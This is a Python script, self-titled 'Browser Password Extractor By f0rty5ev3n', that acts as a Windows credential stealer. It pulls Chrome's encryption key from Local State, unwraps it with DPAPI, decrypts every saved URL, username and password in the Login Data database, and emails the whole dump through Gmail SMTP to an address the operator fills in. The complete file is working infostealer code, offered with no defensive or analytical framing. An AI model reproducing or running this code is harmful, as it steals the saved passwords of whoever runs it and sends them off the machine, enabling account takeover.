import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import smtplib
import subprocess
import sys

# your gmail credentials
email = "your_gmail_address"
password = "gmail_password"


def get_master_key():
    # open the file called Local State to get the master key
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        # load the file as json
        local_state = json.loads(local_state)
        # decode the available base64 data 
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        # return the final master key
        return master_key

# passsing the cipher to decrypt the payload
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# generating a cipher for the obtained iv with the help of the master_key
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


# decrypt password one by one with the help of master key
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15] # only characters between 3-15 are required
        payload = buff[15:] # remove prefix
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        # returning the decrypted password
        return decrypted_pass
    except Exception as e:
        # if we're unable to decrypt the password, it is because the version is unsupproted
        return "Unsupproted Chrome Version"


# function to send an email
def send_mail(email, password, message):
    # gmail SMTP connection
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # tell the server that a connection is being made
    server.starttls()
    # login to the email account
    server.login(email, password)
    # sending email from your email address to your own email address along with the message
    server.sendmail(email, email, message)
    # quit the session after sending a message
    server.quit()


# consists the final message that is to be sent via email
total_log = "----Browser Password Extractor By f0rty5ev3n----\n\n"

# getting the returned master key by calling the function get_master_key
master_key = get_master_key()

# actual Login DB location for Chrome
# for Microsoft Edge, use AppData\Local\Microsoft\Edge\User Data\Default\Login Data
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'

# making a temp copy since Login Data DB is locked while Chrome is running
shutil.copy2(login_db, "Loginvault.db") 

# connecting to the copied DB
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
try:
    # getting url, username and password from the Login DB with the help of sqlite3
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    for r in cursor.fetchall():
        # define url as a row 0 of the DB
        url = r[0]

        # define username as a row 1 of the DB
        username = r[1]

        # define encrypted_password as a row 2 of the DB
        encrypted_password = r[2]

        # passing the encrypted password to previously defined decrypt_password function and getting the returned final password
        decrypted_password = decrypt_password(encrypted_password, master_key)

        # if DB containes more than 0 usernames, then append it to total_log one by one
        if len(username) > 0:
            log = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")

            # adding each credential as a string to the total_log one by one without replacing the current available data in total_log
            total_log = total_log + str(log)

except Exception as e:
    pass

# leave the cursor and close the DB connection safely
cursor.close()
conn.close()
try:
    # try deleting the temp database at the end
    os.remove("Loginvault.db")
except Exception as e:
    pass

# now that we have all the passwords decrypted in the total_log, we'll call the send_mail function and pass the total_log as a message
send_mail(email, password, "\n\n" + total_log)

